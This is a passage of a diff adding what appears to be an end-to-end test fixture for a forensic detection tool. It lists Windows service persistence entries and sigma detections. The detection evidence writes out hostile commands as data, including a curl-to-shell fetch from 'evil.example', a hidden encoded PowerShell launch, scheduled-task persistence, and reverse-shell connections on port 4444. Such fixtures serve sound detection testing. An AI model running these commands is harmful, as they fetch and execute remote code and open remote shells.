+    "severity": "low",
+    "title": "[PERSISTENCE service] WIMMount",
+    "detail": "system32\\drivers\\wimmount.sys",
+    "ref": "persistence:582",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WiaRpc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:581",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WFDSConMgrSvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:580",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WerSvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k WerSvcGroup",
+    "ref": "persistence:579",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wercplsupport",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k netsvcs -p",
+    "ref": "persistence:578",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WEPHOSTSVC",
+    "detail": "%systemroot%\\system32\\svchost.exe -k WepHostSvcGroup",
+    "ref": "persistence:577",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] Wecsvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k NetworkService -p",
+    "ref": "persistence:576",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WebClient",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalService -p",
+    "ref": "persistence:575",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WdNisSvc",
+    "detail": "\"%ProgramData%\\Microsoft\\Windows Defender\\Platform\\4.18.26090.9-0\\NisSrv.exe\"",
+    "ref": "persistence:574",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WdNisDrv",
+    "detail": "system32\\drivers\\wd\\WdNisDrv.sys",
+    "ref": "persistence:573",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WdmCompanionFilter",
+    "detail": "system32\\drivers\\WdmCompanionFilter.sys",
+    "ref": "persistence:572",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wdiwifi",
+    "detail": "system32\\DRIVERS\\wdiwifi.sys",
+    "ref": "persistence:571",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WdiSystemHost",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "ref": "persistence:570",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WdiServiceHost",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalService -p",
+    "ref": "persistence:569",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wcnfs",
+    "detail": "\\SystemRoot\\system32\\drivers\\wcnfs.sys",
+    "ref": "persistence:568",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wcncsvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalServiceAndNoImpersonation -p",
+    "ref": "persistence:567",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] Wcmsvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "ref": "persistence:566",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wcifs",
+    "detail": "\\SystemRoot\\system32\\drivers\\wcifs.sys",
+    "ref": "persistence:565",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WbioSrvc",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k WbioSvcGroup",
+    "ref": "persistence:564",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wbengine",
+    "detail": "\"%systemroot%\\system32\\wbengine.exe\"",
+    "ref": "persistence:563",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WarpJITSvc",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k LocalServiceNetworkRestricted",
+    "ref": "persistence:562",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wanarpv6",
+    "detail": "System32\\DRIVERS\\wanarp.sys",
+    "ref": "persistence:561",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] wanarp",
+    "detail": "System32\\DRIVERS\\wanarp.sys",
+    "ref": "persistence:560",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WalletService",
+    "detail": "%SystemRoot%\\System32\\svchost.exe -k appmodel -p",
+    "ref": "persistence:559",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WacomPen",
+    "detail": "\\SystemRoot\\System32\\drivers\\wacompen.sys",
+    "ref": "persistence:558",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] WaaSMedicSvc",
+    "detail": "%systemroot%\\system32\\svchost.exe -k wusvcs -p",
+    "ref": "persistence:557",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] W32Time",
+    "detail": "%SystemRoot%\\system32\\svchost.exe -k LocalService",
+    "ref": "persistence:556",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vwifimp",
+    "detail": "\\SystemRoot\\System32\\drivers\\vwifimp.sys",
+    "ref": "persistence:555",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vwifibus",
+    "detail": "\\SystemRoot\\System32\\drivers\\vwifibus.sys",
+    "ref": "persistence:554",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VSS",
+    "detail": "%systemroot%\\system32\\vssvc.exe",
+    "ref": "persistence:553",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vpcivsp",
+    "detail": "\\SystemRoot\\System32\\drivers\\vpcivsp.sys",
+    "ref": "persistence:552",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmx86",
+    "detail": "\\SystemRoot\\system32\\DRIVERS\\vmx86.sys",
+    "ref": "persistence:551",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VmwareAutostartService",
+    "detail": "\"C:\\Program Files (x86)\\VMware\\VMware Workstation\\vmware-autostart.exe\"",
+    "ref": "persistence:550",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMware NAT Service",
+    "detail": "C:\\Windows\\SysWOW64\\vmnat.exe",
+    "ref": "persistence:549",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMUSBArbService",
+    "detail": "\"C:\\Program Files (x86)\\Common Files\\VMware\\USB\\vmware-usbarbitrator64.exe\"",
+    "ref": "persistence:548",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] vmusb",
+    "detail": "\\SystemRoot\\System32\\drivers\\vmusb.sys",
+    "ref": "persistence:547",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMSVSP",
+    "detail": "System32\\drivers\\vmswitch.sys",
+    "ref": "persistence:546",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   },
+   {
+    "ts": "2026-10-20T02:09:30+00:00",
+    "kind": "persistence",
+    "severity": "low",
+    "title": "[PERSISTENCE service] VMSVSF",
+    "detail": "System32\\drivers\\vmswitch.sys",
+    "ref": "persistence:545",
+    "_dt": "2026-10-20 02:09:30+00:00"
+   }
+  ],
+  "total": 699,
+  "skew": [],
+  "skew_scope": "displayed_events"
+ },
+ "detections": [
+  {
+   "id": 2,
+   "host_id": 1,
+   "hostname": "ator-win10-host",
+   "rule_name": "PowerShell Encoded Command Execution",
+   "rule_type": "sigma",
+   "severity": "high",
+   "technique_id": "T1059.001",
+   "technique_name": "PowerShell",
+   "tactics": [
+    {
+     "short": "execution",
+     "name": "Execution"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "4100",
+    "ppid": "500",
+    "name": "powershell.exe",
+    "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAKQAgAA==",
+    "exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+   }
+  },
+  {
+   "id": 3,
+   "host_id": 1,
+   "hostname": "ator-win10-host",
+   "rule_name": "Suspicious Reverse Shell Destination Ports",
+   "rule_type": "sigma",
+   "severity": "critical",
+   "technique_id": "T1071.001",
+   "technique_name": "Web Protocols",
+   "tactics": [
+    {
+     "short": "command-and-control",
+     "name": "Command and Control"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "4100",
+    "remote_ip": "198.51.100.23",
+    "remote_port": "4444",
+    "local_ip": "10.0.0.2",
+    "local_port": "51000",
+    "proto": "tcp",
+    "process_name": "powershell.exe"
+   }
+  },
+  {
+   "id": 5,
+   "host_id": 1,
+   "hostname": "ator-win10-host",
+   "rule_name": "Scheduled Task Creation via Schtasks",
+   "rule_type": "sigma",
+   "severity": "medium",
+   "technique_id": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "tactics": [
+    {
+     "short": "execution",
+     "name": "Execution"
+    },
+    {
+     "short": "persistence",
+     "name": "Persistence"
+    },
+    {
+     "short": "privilege-escalation",
+     "name": "Privilege Escalation"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "4102",
+    "ppid": "4100",
+    "name": "schtasks.exe",
+    "cmdline": "schtasks.exe /create /tn AtorPersist /tr cmd.exe /sc once",
+    "exe_path": "C:\\Windows\\System32\\schtasks.exe"
+   }
+  },
+  {
+   "id": 6,
+   "host_id": 1,
+   "hostname": "ator-win10-host",
+   "rule_name": "Account Discovery via Whoami",
+   "rule_type": "sigma",
+   "severity": "low",
+   "technique_id": "T1033",
+   "technique_name": "System Owner/User Discovery",
+   "tactics": [
+    {
+     "short": "discovery",
+     "name": "Discovery"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "4101",
+    "ppid": "4100",
+    "name": "whoami.exe",
+    "cmdline": "whoami.exe /priv",
+    "exe_path": "C:\\Windows\\System32\\whoami.exe"
+   }
+  },
+  {
+   "id": 1,
+   "host_id": 2,
+   "hostname": "ator-ubuntu-vm",
+   "rule_name": "Linux Curl or Wget Piped to Shell",
+   "rule_type": "sigma",
+   "severity": "high",
+   "technique_id": "T1059.004",
+   "technique_name": "Unix Shell",
+   "tactics": [
+    {
+     "short": "execution",
+     "name": "Execution"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "2001",
+    "ppid": "1500",
+    "name": "bash",
+    "cmdline": "bash -c 'curl http://evil.example/x.sh | sh'",
+    "exe_path": "/usr/bin/bash",
+    "username": "root"
+   }
+  },
+  {
+   "id": 4,
+   "host_id": 2,
+   "hostname": "ator-ubuntu-vm",
+   "rule_name": "Suspicious Reverse Shell Destination Ports",
+   "rule_type": "sigma",
+   "severity": "critical",
+   "technique_id": "T1071.001",
+   "technique_name": "Web Protocols",
+   "tactics": [
+    {
+     "short": "command-and-control",
+     "name": "Command and Control"
+    }
+   ],
+   "detected_at_utc": "2026-10-20T02:09:30+00:00",
+   "last_seen_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "evidence": {
+    "pid": "2001",
+    "remote_ip": "203.0.113.66",
+    "remote_port": "4444",
+    "local_ip": "10.0.0.9",
+    "local_port": "55000",
+    "proto": "tcp",
+    "process_name": "bash"
+   }
+  }
+ ],
+ "root_cause_rows": [
+  {
+   "rule_name": "Account Discovery via Whoami",
+   "rule_type": "sigma",
+   "severity": "low",
+   "technique_id": "T1033",
+   "root_cause": "Host / account discovery activity",
+   "where_machine": "ator-win10-host (windows)",
+   "where_locus": "process C:\\Windows\\System32\\whoami.exe (pid 4101)",
+   "when_first_utc": "2026-10-20T02:09:30+00:00",
+   "when_last_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "investigation_hint": ""
+  },
+  {
+   "rule_name": "Scheduled Task Creation via Schtasks",
+   "rule_type": "sigma",
+   "severity": "medium",
+   "technique_id": "T1053.005",
+   "root_cause": "Persistence mechanism registered to survive logoff/reboot",
+   "where_machine": "ator-win10-host (windows)",
+   "where_locus": "process C:\\Windows\\System32\\schtasks.exe (pid 4102)",
+   "when_first_utc": "2026-10-20T02:09:30+00:00",
+   "when_last_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "investigation_hint": ""
+  },
+  {
+   "rule_name": "Suspicious Reverse Shell Destination Ports",
+   "rule_type": "sigma",
+   "severity": "critical",
+   "technique_id": "T1071.001",
+   "root_cause": "Outbound connection to a reverse-shell / C2 destination",
+   "where_machine": "ator-win10-host (windows)",
+   "where_locus": "process powershell.exe (pid 4100); network 198.51.100.23:4444",
+   "when_first_utc": "2026-10-20T02:09:30+00:00",
+   "when_last_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "investigation_hint": ""
+  },
+  {
+   "rule_name": "PowerShell Encoded Command Execution",
+   "rule_type": "sigma",
+   "severity": "high",
+   "technique_id": "T1059.001",
+   "root_cause": "Obfuscated / encoded command execution",
+   "where_machine": "ator-win10-host (windows)",
+   "where_locus": "process C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (pid 4100)",
+   "when_first_utc": "2026-10-20T02:09:30+00:00",
+   "when_last_utc": "2026-10-20T02:09:30+00:00",
+   "hit_count": 1,
+   "investigation_hint": ""
+  }
+ ],
+ "manifests": [
+  {
+   "collection_id": "f991d3ac-c496-414b-8943-afd403f89bf8",
+   "started_at_utc": "2026-10-20T02:07:18+00:00",
+   "finished_at_utc": "2026-10-20T02:09:30+00:00",
+   "agent_version": "1.0.0",
+   "artifact_count": 1342,
+   "manifest_sha256": "48c49312a5cdc5bc9140260bcc59d30c9772bc5274363f6709d6a58a273611d1"
+  },
+  {
+   "collection_id": "win-atk-001",
+   "started_at_utc": "2026-10-20T02:09:30+00:00",
+   "finished_at_utc": "2026-10-20T02:09:30+00:00",
+   "agent_version": "1.0.0-e2e",
+   "artifact_count": 6,
+   "manifest_sha256": "b32675b6755be2a2339c63e58dd09e50587b16b29392bc894662af187aa25f6c"
+  }
+ ],
+ "generated_at_utc": "2026-10-20T02:25:15+00:00"
+}
